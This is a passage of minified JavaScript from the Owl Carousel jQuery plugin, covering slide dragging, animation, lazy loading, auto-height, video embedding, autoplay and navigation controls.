this.invalidate("position")), this.$element.toggleClass(this.options.grabClass, "mousedown" === t.type), this.speed(0), this._drag.time = (new Date).getTime(), this._drag.target = g(t.target), this._drag.stage.start = e, this._drag.stage.current = e, this._drag.pointer = this.pointer(t), g(o).on("mouseup.owl.core touchend.owl.core", g.proxy(this.onDragEnd, this)), g(o).one("mousemove.owl.core touchmove.owl.core", g.proxy(function (t) { var e = this.difference(this._drag.pointer, this.pointer(t)); g(o).on("mousemove.owl.core touchmove.owl.core", g.proxy(this.onDragMove, this)), Math.abs(e.x) < Math.abs(e.y) && this.is("valid") || (t.preventDefault(), this.enter("dragging"), this.trigger("drag")) }, this))) }, l.prototype.onDragMove = function (t) { var e = null, n = null, i = null, o = this.difference(this._drag.pointer, this.pointer(t)), a = this.difference(this._drag.stage.start, o); this.is("dragging") && (t.preventDefault(), this.settings.loop ? (e = this.coordinates(this.minimum()), n = this.coordinates(this.maximum() + 1) - e, a.x = ((a.x - e) % n + n) % n + e) : (e = this.settings.rtl ? this.coordinates(this.maximum()) : this.coordinates(this.minimum()), n = this.settings.rtl ? this.coordinates(this.minimum()) : this.coordinates(this.maximum()), i = this.settings.pullDrag ? -1 * o.x / 5 : 0, a.x = Math.max(Math.min(a.x, e + i), n + i)), this._drag.stage.current = a, this.animate(a.x)) }, l.prototype.onDragEnd = function (t) { var e = this.difference(this._drag.pointer, this.pointer(t)), n = this._drag.stage.current, i = 0 < e.x ^ this.settings.rtl ? "left" : "right"; g(o).off(".owl.core"), this.$element.removeClass(this.options.grabClass), (0 !== e.x && this.is("dragging") || !this.is("valid")) && (this.speed(this.settings.dragEndSpeed || this.settings.smartSpeed), this.current(this.closest(n.x, 0 !== e.x ? i : this._drag.direction)), this.invalidate("position"), this.update(), this._drag.direction = i, (3 < Math.abs(e.x) || 300 < (new Date).getTime() - this._drag.time) && this._drag.target.one("click.owl.core", function () { return !1 })), this.is("dragging") && (this.leave("dragging"), this.trigger("dragged")) }, l.prototype.closest = function (n, i) { var o = -1, a = this.width(), s = this.coordinates(); return this.settings.freeDrag || g.each(s, g.proxy(function (t, e) { return "left" === i && e - 30 < n && n < e + 30 ? o = t : "right" === i && e - a - 30 < n && n < e - a + 30 ? o = t + 1 : this.op(n, "<", e) && this.op(n, ">", s[t + 1] !== r ? s[t + 1] : e - a) && (o = "left" === i ? t + 1 : t), -1 === o }, this)), this.settings.loop || (this.op(n, ">", s[this.minimum()]) ? o = n = this.minimum() : this.op(n, "<", s[this.maximum()]) && (o = n = this.maximum())), o }, l.prototype.animate = function (t) { var e = 0 < this.speed(); this.is("animating") && this.onTransitionEnd(), e && (this.enter("animating"), this.trigger("translate")), g.support.transform3d && g.support.transition ? this.$stage.css({ transform: "translate3d(" + t + "px,0px,0px)", transition: this.speed() / 1e3 + "s" + (this.settings.slideTransition ? " " + this.settings.slideTransition : "") }) : e ? this.$stage.animate({ left: t + "px" }, this.speed(), this.settings.fallbackEasing, g.proxy(this.onTransitionEnd, this)) : this.$stage.css({ left: t + "px" }) }, l.prototype.is = function (t) { return this._states.current[t] && 0 < this._states.current[t] }, l.prototype.current = function (t) { return t === r ? this._current : 0 === this._items.length ? r : (t = this.normalize(t), this._current !== t && ((e = this.trigger("change", { property: { name: "position", value: t } })).data !== r && (t = this.normalize(e.data)), this._current = t, this.invalidate("position"), this.trigger("changed", { property: { name: "position", value: this._current } })), this._current); var e }, l.prototype.invalidate = function (t) { return "string" === g.type(t) && (this._invalidated[t] = !0, this.is("valid") && this.leave("valid")), g.map(this._invalidated, function (t, e) { return e }) }, l.prototype.reset = function (t) { (t = this.normalize(t)) !== r && (this._speed = 0, this._current = t, this.suppress(["translate", "translated"]), this.animate(this.coordinates(t)), this.release(["translate", "translated"])) }, l.prototype.normalize = function (t, e) { var n = this._items.length, i = e ? 0 : this._clones.length; return !this.isNumeric(t) || n < 1 ? t = r : (t < 0 || n + i <= t) && (t = ((t - i / 2) % n + n) % n + i / 2), t }, l.prototype.relative = function (t) { return t -= this._clones.length / 2, this.normalize(t, !0) }, l.prototype.maximum = function (t) { var e, n, i, o = this.settings, a = this._coordinates.length; if (o.loop) a = this._clones.length / 2 + this._items.length - 1; else if (o.autoWidth || o.merge) { if (e = this._items.length) for (n = this._items[--e].width(), i = this.$element.width(); e-- && !(i < (n += this._items[e].width() + this.settings.margin));); a = e + 1 } else a = o.center ? this._items.length - 1 : this._items.length - o.items; return t && (a -= this._clones.length / 2), Math.max(a, 0) }, l.prototype.minimum = function (t) { return t ? 0 : this._clones.length / 2 }, l.prototype.items = function (t) { return t === r ? this._items.slice() : (t = this.normalize(t, !0), this._items[t]) }, l.prototype.mergers = function (t) { return t === r ? this._mergers.slice() : (t = this.normalize(t, !0), this._mergers[t]) }, l.prototype.clones = function (n) { function i(t) { return t % 2 == 0 ? o + t / 2 : e - (t + 1) / 2 } var e = this._clones.length / 2, o = e + this._items.length; return n === r ? g.map(this._clones, function (t, e) { return i(e) }) : g.map(this._clones, function (t, e) { return t === n ? i(e) : null }) }, l.prototype.speed = function (t) { return t !== r && (this._speed = t), this._speed }, l.prototype.coordinates = function (t) { var e, n = 1, i = t - 1; return t === r ? g.map(this._coordinates, g.proxy(function (t, e) { return this.coordinates(e) }, this)) : (this.settings.center ? (this.settings.rtl && (n = -1, i = t + 1), e = this._coordinates[t], e += (this.width() - e + (this._coordinates[i] || 0)) / 2 * n) : e = this._coordinates[i] || 0, e = Math.ceil(e)) }, l.prototype.duration = function (t, e, n) { return 0 === n ? 0 : Math.min(Math.max(Math.abs(e - t), 1), 6) * Math.abs(n || this.settings.smartSpeed) }, l.prototype.to = function (t, e) { var n = this.current(), i = null, o = t - this.relative(n), a = (0 < o) - (o < 0), s = this._items.length, r = this.minimum(), g = this.maximum(); this.settings.loop ? (!this.settings.rewind && Math.abs(o) > s / 2 && (o += -1 * a * s), (i = (((t = n + o) - r) % s + s) % s + r) !== t && i - o <= g && 0 < i - o && (n = i - o, t = i, this.reset(n))) : t = this.settings.rewind ? (t % (g += 1) + g) % g : Math.max(r, Math.min(g, t)), this.speed(this.duration(n, t, e)), this.current(t), this.isVisible() && this.update() }, l.prototype.next = function (t) { t = t || !1, this.to(this.relative(this.current()) + 1, t) }, l.prototype.prev = function (t) { t = t || !1, this.to(this.relative(this.current()) - 1, t) }, l.prototype.onTransitionEnd = function (t) { if (t !== r && (t.stopPropagation(), (t.target || t.srcElement || t.originalTarget) !== this.$stage.get(0))) return !1; this.leave("animating"), this.trigger("translated") }, l.prototype.viewport = function () { var t; return this.options.responsiveBaseElement !== n ? t = g(this.options.responsiveBaseElement).width() : n.innerWidth ? t = n.innerWidth : o.documentElement && o.documentElement.clientWidth ? t = o.documentElement.clientWidth : console.warn("Can not detect viewport width."), t }, l.prototype.replace = function (t) { this.$stage.empty(), this._items = [], t = t && (t instanceof jQuery ? t : g(t)), this.settings.nestedItemSelector && (t = t.find("." + this.settings.nestedItemSelector)), t.filter(function () { return 1 === this.nodeType }).each(g.proxy(function (t, e) { e = this.prepare(e), this.$stage.append(e), this._items.push(e), this._mergers.push(+e.find("[data-merge]").addBack("[data-merge]").attr("data-merge") || 1) }, this)), this.reset(this.isNumeric(this.settings.startPosition) ? this.settings.startPosition : 0), this.invalidate("items") }, l.prototype.add = function (t, e) { var n = this.relative(this._current); e = e === r ? this._items.length : this.normalize(e, !0), t = t instanceof jQuery ? t : g(t), this.trigger("add", { content: t, position: e }), t = this.prepare(t), 0 === this._items.length || e === this._items.length ? (0 === this._items.length && this.$stage.append(t), 0 !== this._items.length && this._items[e - 1].after(t), this._items.push(t), this._mergers.push(+t.find("[data-merge]").addBack("[data-merge]").attr("data-merge") || 1)) : (this._items[e].before(t), this._items.splice(e, 0, t), this._mergers.splice(e, 0, +t.find("[data-merge]").addBack("[data-merge]").attr("data-merge") || 1)), this._items[n] && this.reset(this._items[n].index()), this.invalidate("items"), this.trigger("added", { content: t, position: e }) }, l.prototype.remove = function (t) { (t = this.normalize(t, !0)) !== r && (this.trigger("remove", { content: this._items[t], position: t }), this._items[t].remove(), this._items.splice(t, 1), this._mergers.splice(t, 1), this.invalidate("items"), this.trigger("removed", { content: null, position: t })) }, l.prototype.preloadAutoWidthImages = function (t) { t.each(g.proxy(function (t, e) { this.enter("pre-loading"), e = g(e), g(new Image).one("load", g.proxy(function (t) { e.attr("src", t.target.src), e.css("opacity", 1), this.leave("pre-loading"), this.is("pre-loading") || this.is("initializing") || this.refresh() }, this)).attr("src", e.attr("src") || e.attr("data-src") || e.attr("data-src-retina")) }, this)) }, l.prototype.destroy = function () { for (var t in this.$element.off(".owl.core"), this.$stage.off(".owl.core"), g(o).off(".owl.core"), !1 !== this.settings.responsive && (n.clearTimeout(this.resizeTimer), this.off(n, "resize", this._handlers.onThrottledResize)), this._plugins) this._plugins[t].destroy(); this.$stage.children(".cloned").remove(), this.$stage.unwrap(), this.$stage.children().contents().unwrap(), this.$stage.children().unwrap(), this.$stage.remove(), this.$element.removeClass(this.options.refreshClass).removeClass(this.options.loadingClass).removeClass(this.options.loadedClass).removeClass(this.options.rtlClass).removeClass(this.options.dragClass).removeClass(this.options.grabClass).attr("class", this.$element.attr("class").replace(new RegExp(this.options.responsiveClass + "-\\S+\\s", "g"), "")).removeData("owl.carousel") }, l.prototype.op = function (t, e, n) { var i = this.settings.rtl; switch (e) { case "<": return i ? n < t : t < n; case ">": return i ? t < n : n < t; case ">=": return i ? t <= n : n <= t; case "<=": return i ? n <= t : t <= n } }, l.prototype.on = function (t, e, n, i) { t.addEventListener ? t.addEventListener(e, n, i) : t.attachEvent && t.attachEvent("on" + e, n) }, l.prototype.off = function (t, e, n, i) { t.removeEventListener ? t.removeEventListener(e, n, i) : t.detachEvent && t.detachEvent("on" + e, n) }, l.prototype.trigger = function (t, e, n, i, o) { var a = { item: { count: this._items.length, index: this.current() } }, s = g.camelCase(g.grep(["on", t, n], function (t) { return t }).join("-").toLowerCase()), r = g.Event([t, "owl", n || "carousel"].join(".").toLowerCase(), g.extend({ relatedTarget: this }, a, e)); return this._supress[t] || (g.each(this._plugins, function (t, e) { e.onTrigger && e.onTrigger(r) }), this.register({ type: l.Type.Event, name: t }), this.$element.trigger(r), this.settings && "function" == typeof this.settings[s] && this.settings[s].call(this, r)), r }, l.prototype.enter = function (t) { g.each([t].concat(this._states.tags[t] || []), g.proxy(function (t, e) { this._states.current[e] === r && (this._states.current[e] = 0), this._states.current[e]++ }, this)) }, l.prototype.leave = function (t) { g.each([t].concat(this._states.tags[t] || []), g.proxy(function (t, e) { this._states.current[e]-- }, this)) }, l.prototype.register = function (n) { var e; n.type === l.Type.Event ? (g.event.special[n.name] || (g.event.special[n.name] = {}), g.event.special[n.name].owl || (e = g.event.special[n.name]._default, g.event.special[n.name]._default = function (t) { return !e || !e.apply || t.namespace && -1 !== t.namespace.indexOf("owl") ? t.namespace && -1 < t.namespace.indexOf("owl") : e.apply(this, arguments) }, g.event.special[n.name].owl = !0)) : n.type === l.Type.State && (this._states.tags[n.name] ? this._states.tags[n.name] = this._states.tags[n.name].concat(n.tags) : this._states.tags[n.name] = n.tags, this._states.tags[n.name] = g.grep(this._states.tags[n.name], g.proxy(function (t, e) { return g.inArray(t, this._states.tags[n.name]) === e }, this))) }, l.prototype.suppress = function (t) { g.each(t, g.proxy(function (t, e) { this._supress[e] = !0 }, this)) }, l.prototype.release = function (t) { g.each(t, g.proxy(function (t, e) { delete this._supress[e] }, this)) }, l.prototype.pointer = function (t) { var e = { x: null, y: null }; return (t = (t = t.originalEvent || t || n.event).touches && t.touches.length ? t.touches[0] : t.changedTouches && t.changedTouches.length ? t.changedTouches[0] : t).pageX ? (e.x = t.pageX, e.y = t.pageY) : (e.x = t.clientX, e.y = t.clientY), e }, l.prototype.isNumeric = function (t) { return !isNaN(parseFloat(t)) }, l.prototype.difference = function (t, e) { return { x: t.x - e.x, y: t.y - e.y } }, g.fn.owlCarousel = function (e) { var i = Array.prototype.slice.call(arguments, 1); return this.each(function () { var t = g(this), n = t.data("owl.carousel"); n || (n = new l(this, "object" == typeof e && e), t.data("owl.carousel", n), g.each(["next", "prev", "to", "destroy", "refresh", "replace", "add", "remove"], function (t, e) { n.register({ type: l.Type.Event, name: e }), n.$element.on(e + ".owl.carousel.core", g.proxy(function (t) { t.namespace && t.relatedTarget !== this && (this.suppress([e]), n[e].apply(this, [].slice.call(arguments, 1)), this.release([e])) }, n)) })), "string" == typeof e && "_" !== e.charAt(0) && n[e].apply(n, i) }) }, g.fn.owlCarousel.Constructor = l }(window.Zepto || window.jQuery, window, document), function (e, n) { var i = function (t) { this._core = t, this._interval = null, this._visible = null, this._handlers = { "initialized.owl.carousel": e.proxy(function (t) { t.namespace && this._core.settings.autoRefresh && this.watch() }, this) }, this._core.options = e.extend({}, i.Defaults, this._core.options), this._core.$element.on(this._handlers) }; i.Defaults = { autoRefresh: !0, autoRefreshInterval: 500 }, i.prototype.watch = function () { this._interval || (this._visible = this._core.isVisible(), this._interval = n.setInterval(e.proxy(this.refresh, this), this._core.settings.autoRefreshInterval)) }, i.prototype.refresh = function () { this._core.isVisible() !== this._visible && (this._visible = !this._visible, this._core.$element.toggleClass("owl-hidden", !this._visible), this._visible && this._core.invalidate("width") && this._core.refresh()) }, i.prototype.destroy = function () { var t, e; for (t in n.clearInterval(this._interval), this._handlers) this._core.$element.off(t, this._handlers[t]); for (e in Object.getOwnPropertyNames(this)) "function" != typeof this[e] && (this[e] = null) }, e.fn.owlCarousel.Constructor.Plugins.AutoRefresh = i }(window.Zepto || window.jQuery, window, document), function (r, a) { var e = function (t) { this._core = t, this._loaded = [], this._handlers = { "initialized.owl.carousel change.owl.carousel resized.owl.carousel": r.proxy(function (t) { if (t.namespace && this._core.settings && this._core.settings.lazyLoad && (t.property && "position" == t.property.name || "initialized" == t.type)) { var e = this._core.settings, n = e.center && Math.ceil(e.items / 2) || e.items, i = e.center && -1 * n || 0, o = (t.property && void 0 !== t.property.value ? t.property.value : this._core.current()) + i, a = this._core.clones().length, s = r.proxy(function (t, e) { this.load(e) }, this); for (0 < e.lazyLoadEager && (n += e.lazyLoadEager, e.loop && (o -= e.lazyLoadEager, n++)); i++ < n;)this.load(a / 2 + this._core.relative(o)), a && r.each(this._core.clones(this._core.relative(o)), s), o++ } }, this) }, this._core.options = r.extend({}, e.Defaults, this._core.options), this._core.$element.on(this._handlers) }; e.Defaults = { lazyLoad: !1, lazyLoadEager: 0 }, e.prototype.load = function (t) { var e = this._core.$stage.children().eq(t), n = e && e.find(".owl-lazy"); !n || -1 < r.inArray(e.get(0), this._loaded) || (n.each(r.proxy(function (t, e) { var n, i = r(e), o = 1 < a.devicePixelRatio && i.attr("data-src-retina") || i.attr("data-src") || i.attr("data-srcset"); this._core.trigger("load", { element: i, url: o }, "lazy"), i.is("img") ? i.one("load.owl.lazy", r.proxy(function () { i.css("opacity", 1), this._core.trigger("loaded", { element: i, url: o }, "lazy") }, this)).attr("src", o) : i.is("source") ? i.one("load.owl.lazy", r.proxy(function () { this._core.trigger("loaded", { element: i, url: o }, "lazy") }, this)).attr("srcset", o) : ((n = new Image).onload = r.proxy(function () { i.css({ "background-image": 'url("' + o + '")', opacity: "1" }), this._core.trigger("loaded", { element: i, url: o }, "lazy") }, this), n.src = o) }, this)), this._loaded.push(e.get(0))) }, e.prototype.destroy = function () { var t, e; for (t in this.handlers) this._core.$element.off(t, this.handlers[t]); for (e in Object.getOwnPropertyNames(this)) "function" != typeof this[e] && (this[e] = null) }, r.fn.owlCarousel.Constructor.Plugins.Lazy = e }(window.Zepto || window.jQuery, window, document), function (s, n) { var i = function (t) { this._core = t, this._previousHeight = null, this._handlers = { "initialized.owl.carousel refreshed.owl.carousel": s.proxy(function (t) { t.namespace && this._core.settings.autoHeight && this.update() }, this), "changed.owl.carousel": s.proxy(function (t) { t.namespace && this._core.settings.autoHeight && "position" === t.property.name && this.update() }, this), "loaded.owl.lazy": s.proxy(function (t) { t.namespace && this._core.settings.autoHeight && t.element.closest("." + this._core.settings.itemClass).index() === this._core.current() && this.update() }, this) }, this._core.options = s.extend({}, i.Defaults, this._core.options), this._core.$element.on(this._handlers), this._intervalId = null; var e = this; s(n).on("load", function () { e._core.settings.autoHeight && e.update() }), s(n).resize(function () { e._core.settings.autoHeight && (null != e._intervalId && clearTimeout(e._intervalId), e._intervalId = setTimeout(function () { e.update() }, 250)) }) }; i.Defaults = { autoHeight: !1, autoHeightClass: "owl-height" }, i.prototype.update = function () { var t = this._core._current, e = t + this._core.settings.items, n = this._core.settings.lazyLoad, i = this._core.$stage.children().toArray().slice(t, e), o = [], a = 0; s.each(i, function (t, e) { o.push(s(e).height()) }), (a = Math.max.apply(null, o)) <= 1 && n && this._previousHeight && (a = this._previousHeight), this._previousHeight = a, this._core.$stage.parent().height(a).addClass(this._core.settings.autoHeightClass) }, i.prototype.destroy = function () { var t, e; for (t in this._handlers) this._core.$element.off(t, this._handlers[t]); for (e in Object.getOwnPropertyNames(this)) "function" != typeof this[e] && (this[e] = null) }, s.fn.owlCarousel.Constructor.Plugins.AutoHeight = i }(window.Zepto || window.jQuery, window, document), function (c, e) { var n = function (t) { this._core = t, this._videos = {}, this._playing = null, this._handlers = { "initialized.owl.carousel": c.proxy(function (t) { t.namespace && this._core.register({ type: "state", name: "playing", tags: ["interacting"] }) }, this), "resize.owl.carousel": c.proxy(function (t) { t.namespace && this._core.settings.video && this.isInFullScreen() && t.preventDefault() }, this), "refreshed.owl.carousel": c.proxy(function (t) { t.namespace && this._core.is("resizing") && this._core.$stage.find(".cloned .owl-video-frame").remove() }, this), "changed.owl.carousel": c.proxy(function (t) { t.namespace && "position" === t.property.name && this._playing && this.stop() }, this), "prepared.owl.carousel": c.proxy(function (t) { var e; !t.namespace || (e = c(t.content).find(".owl-video")).length && (e.css("display", "none"), this.fetch(e, c(t.content))) }, this) }, this._core.options = c.extend({}, n.Defaults, this._core.options), this._core.$element.on(this._handlers), this._core.$element.on("click.owl.video", ".owl-video-play-icon", c.proxy(function (t) { this.play(t) }, this)) }; n.Defaults = { video: !1, videoHeight: !1, videoWidth: !1 }, n.prototype.fetch = function (t, e) { var n = t.attr("data-vimeo-id") ? "vimeo" : t.attr("data-vzaar-id") ? "vzaar" : "youtube", i = t.attr("data-vimeo-id") || t.attr("data-youtube-id") || t.attr("data-vzaar-id"), o = t.attr("data-width") || this._core.settings.videoWidth, a = t.attr("data-height") || this._core.settings.videoHeight, s = t.attr("href"); if (!s) throw new Error("Missing video URL."); if (-1 < (i = s.match(/(http:|https:|)\/\/(player.|www.|app.)?(vimeo\.com|youtu(be\.com|\.be|be\.googleapis\.com|be\-nocookie\.com)|vzaar\.com)\/(video\/|videos\/|embed\/|channels\/.+\/|groups\/.+\/|watch\?v=|v\/)?([A-Za-z0-9._%-]*)(\&\S+)?/))[3].indexOf("youtu")) n = "youtube"; else if (-1 < i[3].indexOf("vimeo")) n = "vimeo"; else { if (!(-1 < i[3].indexOf("vzaar"))) throw new Error("Video URL not supported."); n = "vzaar" } i = i[6], this._videos[s] = { type: n, id: i, width: o, height: a }, e.attr("data-video", s), this.thumbnail(t, this._videos[s]) }, n.prototype.thumbnail = function (e, t) { function n(t) { i = l.lazyLoad ? c("<div/>", { class: "owl-video-tn " + g, srcType: t }) : c("<div/>", { class: "owl-video-tn", style: "opacity:1;background-image:url(" + t + ")" }), e.after(i), e.after('<div class="owl-video-play-icon"></div>') } var i, o, a = t.width && t.height ? "width:" + t.width + "px;height:" + t.height + "px;" : "", s = e.find("img"), r = "src", g = "", l = this._core.settings; if (e.wrap(c("<div/>", { class: "owl-video-wrapper", style: a })), this._core.settings.lazyLoad && (r = "data-src", g = "owl-lazy"), s.length) return n(s.attr(r)), s.remove(), !1; "youtube" === t.type ? (o = "//img.youtube.com/vi/" + t.id + "/hqdefault.jpg", n(o)) : "vimeo" === t.type ? c.ajax({ type: "GET", url: "//vimeo.com/api/v2/video/" + t.id + ".json", jsonp: "callback", dataType: "jsonp", success: function (t) { o = t[0].thumbnail_large, n(o) } }) : "vzaar" === t.type && c.ajax({ type: "GET", url: "//vzaar.com/api/videos/" + t.id + ".json", jsonp: "callback", dataType: "jsonp", success: function (t) { o = t.framegrab_url, n(o) } }) }, n.prototype.stop = function () { this._core.trigger("stop", null, "video"), this._playing.find(".owl-video-frame").remove(), this._playing.removeClass("owl-video-playing"), this._playing = null, this._core.leave("playing"), this._core.trigger("stopped", null, "video") }, n.prototype.play = function (t) { var e, n = c(t.target).closest("." + this._core.settings.itemClass), i = this._videos[n.attr("data-video")], o = i.width || "100%", a = i.height || this._core.$stage.height(); this._playing || (this._core.enter("playing"), this._core.trigger("play", null, "video"), n = this._core.items(this._core.relative(n.index())), this._core.reset(n.index()), (e = c('<iframe frameborder="0" allowfullscreen mozallowfullscreen webkitAllowFullScreen ></iframe>')).attr("height", a), e.attr("width", o), "youtube" === i.type ? e.attr("src", "//www.youtube.com/embed/" + i.id + "?autoplay=1&rel=0&v=" + i.id) : "vimeo" === i.type ? e.attr("src", "//player.vimeo.com/video/" + i.id + "?autoplay=1") : "vzaar" === i.type && e.attr("src", "//view.vzaar.com/" + i.id + "/player?autoplay=true"), c(e).wrap('<div class="owl-video-frame" />').insertAfter(n.find(".owl-video")), this._playing = n.addClass("owl-video-playing")) }, n.prototype.isInFullScreen = function () { var t = e.fullscreenElement || e.mozFullScreenElement || e.webkitFullscreenElement; return t && c(t).parent().hasClass("owl-video-frame") }, n.prototype.destroy = function () { var t, e; for (t in this._core.$element.off("click.owl.video"), this._handlers) this._core.$element.off(t, this._handlers[t]); for (e in Object.getOwnPropertyNames(this)) "function" != typeof this[e] && (this[e] = null) }, c.fn.owlCarousel.Constructor.Plugins.Video = n }(window.Zepto || window.jQuery, (window, document)), function (s) { var e = function (t) { this.core = t, this.core.options = s.extend({}, e.Defaults, this.core.options), this.swapping = !0, this.previous = void 0, this.next = void 0, this.handlers = { "change.owl.carousel": s.proxy(function (t) { t.namespace && "position" == t.property.name && (this.previous = this.core.current(), this.next = t.property.value) }, this), "drag.owl.carousel dragged.owl.carousel translated.owl.carousel": s.proxy(function (t) { t.namespace && (this.swapping = "translated" == t.type) }, this), "translate.owl.carousel": s.proxy(function (t) { t.namespace && this.swapping && (this.core.options.animateOut || this.core.options.animateIn) && this.swap() }, this) }, this.core.$element.on(this.handlers) }; e.Defaults = { animateOut: !1, animateIn: !1 }, e.prototype.swap = function () { var t, e, n, i, o, a; 1 === this.core.settings.items && s.support.animation && s.support.transition && (this.core.speed(0), e = s.proxy(this.clear, this), n = this.core.$stage.children().eq(this.previous), i = this.core.$stage.children().eq(this.next), o = this.core.settings.animateIn, a = this.core.settings.animateOut, this.core.current() !== this.previous && (a && (t = this.core.coordinates(this.previous) - this.core.coordinates(this.next), n.one(s.support.animation.end, e).css({ left: t + "px" }).addClass("animated owl-animated-out").addClass(a)), o && i.one(s.support.animation.end, e).addClass("animated owl-animated-in").addClass(o))) }, e.prototype.clear = function (t) { s(t.target).css({ left: "" }).removeClass("animated owl-animated-out owl-animated-in").removeClass(this.core.settings.animateIn).removeClass(this.core.settings.animateOut), this.core.onTransitionEnd() }, e.prototype.destroy = function () { var t, e; for (t in this.handlers) this.core.$element.off(t, this.handlers[t]); for (e in Object.getOwnPropertyNames(this)) "function" != typeof this[e] && (this[e] = null) }, s.fn.owlCarousel.Constructor.Plugins.Animate = e }(window.Zepto || window.jQuery, (window, document)), function (i, o, e) { var n = function (t) { this._core = t, this._call = null, this._time = 0, this._timeout = 0, this._paused = !0, this._handlers = { "changed.owl.carousel": i.proxy(function (t) { t.namespace && "settings" === t.property.name ? this._core.settings.autoplay ? this.play() : this.stop() : t.namespace && "position" === t.property.name && this._paused && (this._time = 0) }, this), "initialized.owl.carousel": i.proxy(function (t) { t.namespace && this._core.settings.autoplay && this.play() }, this), "play.owl.autoplay": i.proxy(function (t, e, n) { t.namespace && this.play(e, n) }, this), "stop.owl.autoplay": i.proxy(function (t) { t.namespace && this.stop() }, this), "mouseover.owl.autoplay": i.proxy(function () { this._core.settings.autoplayHoverPause && this._core.is("rotating") && this.pause() }, this), "mouseleave.owl.autoplay": i.proxy(function () { this._core.settings.autoplayHoverPause && this._core.is("rotating") && this.play() }, this), "touchstart.owl.core": i.proxy(function () { this._core.settings.autoplayHoverPause && this._core.is("rotating") && this.pause() }, this), "touchend.owl.core": i.proxy(function () { this._core.settings.autoplayHoverPause && this.play() }, this) }, this._core.$element.on(this._handlers), this._core.options = i.extend({}, n.Defaults, this._core.options) }; n.Defaults = { autoplay: !1, autoplayTimeout: 5e3, autoplayHoverPause: !1, autoplaySpeed: !1 }, n.prototype._next = function (t) { this._call = o.setTimeout(i.proxy(this._next, this, t), this._timeout * (Math.round(this.read() / this._timeout) + 1) - this.read()), this._core.is("interacting") || e.hidden || this._core.next(t || this._core.settings.autoplaySpeed) }, n.prototype.read = function () { return (new Date).getTime() - this._time }, n.prototype.play = function (t, e) { var n; this._core.is("rotating") || this._core.enter("rotating"), t = t || this._core.settings.autoplayTimeout, n = Math.min(this._time % (this._timeout || t), t), this._paused ? (this._time = this.read(), this._paused = !1) : o.clearTimeout(this._call), this._time += this.read() % t - n, this._timeout = t, this._call = o.setTimeout(i.proxy(this._next, this, e), t - n) }, n.prototype.stop = function () { this._core.is("rotating") && (this._time = 0, this._paused = !0, o.clearTimeout(this._call), this._core.leave("rotating")) }, n.prototype.pause = function () { this._core.is("rotating") && !this._paused && (this._time = this.read(), this._paused = !0, o.clearTimeout(this._call)) }, n.prototype.destroy = function () { var t, e; for (t in this.stop(), this._handlers) this._core.$element.off(t, this._handlers[t]); for (e in Object.getOwnPropertyNames(this)) "function" != typeof this[e] && (this[e] = null) }, i.fn.owlCarousel.Constructor.Plugins.autoplay = n }(window.Zepto || window.jQuery, window, document), function (a) { "use strict"; var e = function (t) { this._core = t, this._initialized = !1, this._pages = [], this._controls = {}, this._templates = [], this.$element = this._core.$element, this._overrides = { next: this._core.next, prev: this._core.prev, to: this._core.to }, this._handlers = { "prepared.owl.carousel": a.proxy(function (t) { t.namespace && this._core.settings.dotsData && this._templates.push('<div class="' + this._core.settings.dotClass + '">' + a(t.content).find("[data-dot]").addBack("[data-dot]").attr("data-dot") + "</div>") }, this), "added.owl.carousel": a.proxy(function (t) { t.namespace && this._core.settings.dotsData && this._templates.splice(t.position, 0, this._templates.pop()) }, this), "remove.owl.carousel": a.proxy(function (t) { t.namespace && this._core.settings.dotsData && this._templates.splice(t.position, 1) }, this), "changed.owl.carousel": a.proxy(function (t) { t.namespace && "position" == t.property.name && this.draw() }, this), "initialized.owl.carousel": a.proxy(function (t) { t.namespace && !this._initialized && (this._core.trigger("initialize", null, "navigation"), this.initialize(), this.update(), this.draw(), this._initialized = !0, this._core.trigger("initialized", null, "navigation")) }, this), "refreshed.owl.carousel": a.proxy(function (t) { t.namespace && this._initialized && (this._core.trigger("refresh", null, "navigation"), this.update(), this.draw(), this._core.trigger("refreshed", null, "navigation")) }, this) }, this._core.options = a.extend({}, e.Defaults, this._core.options), this.$element.on(this._handlers) }; e.Defaults = { nav: !1, navText: ['<span aria-label="Previous">&#x2039;</span>', '<span aria-label="Next">&#x203a;</span>'], navSpeed: !1, navElement: 'button type="button" role="presentation"', navContainer: !1, navContainerClass: "owl-nav", navClass: ["owl-prev", "owl-next"], slideBy: 1, dotClass: "owl-dot", dotsClass: "owl-dots", dots: !0, dotsEach: !1, dotsData: !1, dotsSpeed: !1, dotsContainer: !1 }, e.prototype.initialize = function () { var t, n = this._core.settings; for (t in this._controls.$relative = (n.navContainer ? a(n.navContainer) : a("<div>").addClass(n.navContainerClass).appendTo(this.$element)).addClass("disabled"), this._controls.$previous = a("<" + n.navElement + ">").addClass(n.navClass[0]).html(n.navText[0]).prependTo(this._controls.$relative).on("click", a.proxy(function (t) { this.prev(n.navSpeed) }, this)), this._controls.$next = a("<" + n.navElement + ">").addClass(n.navClass[1]).html(n.navText[1]).appendTo(this._controls.$relative).on("click", a.proxy(function (t) { this.next(n.navSpeed) }, this)), n.dotsData || (this._templates = [a('<button role="button">').addClass(n.dotClass).append(a("<span>")).prop("outerHTML")]), this._controls.$absolute = (n.dotsContainer ? a(n.dotsContainer) : a("<div>").addClass(n.dotsClass).appendTo(this.$element)).addClass("disabled"), this._controls.$absolute.on("click", "button", a.proxy(function (t) { var e = a(t.target).parent().is(this._controls.$absolute) ? a(t.target).index() : a(t.target).parent().index(); t.preventDefault(), this.to(e, n.dotsSpeed) }, this)), this._overrides) this._core[t] = a.proxy(this[t], this) }, e.prototype.destroy = function () { var t, e, n, i, o = this._core.settings; for (t in this._handlers) this.$element.off(t, this._handlers[t]); for (e in this._controls) "$relative" === e && o.navContainer ? this._controls[e].html("") : this._controls[e].remove(); for (i in this.overides) this._core[i] = this._overrides[i]; for (n in Object.getOwnPropertyNames(this)) "function" != typeof this[n] && (this[n] = null) }, e.prototype.update = function () { var t, e, n = this._core.clones().length / 2, i = n + this._core.items().length, o = this._core.maximum(!0), a = this._core.settings, s = a.center || a.autoWidth || a.dotsData ? 1 : a.dotsEach || a.items; if ("page" !== a.slideBy && (a.slideBy = Math.min(a.slideBy, a.items)), a.dots || "page" == a.slideBy) for (this._pages = [], t = n, e = 0; t < i; t++) { if (s <= e || 0 === e) { if (this._pages.push({ start: Math.min(o, t - n), end: t - n + s - 1 }), Math.min(o, t - n) === o) break; e = 0, 0 } e += this._core.mergers(this._core.relative(t)) } }, e.prototype.draw = function () { var t, e = this._core.settings, n = this._core.items().length <= e.items, i = this._core.relative(this._core.current()), o = e.loop || e.rewind; this._controls.$relative.toggleClass("disabled", !e.nav || n), e.nav && (this._controls.$previous.toggleClass("disabled", !o && i <= 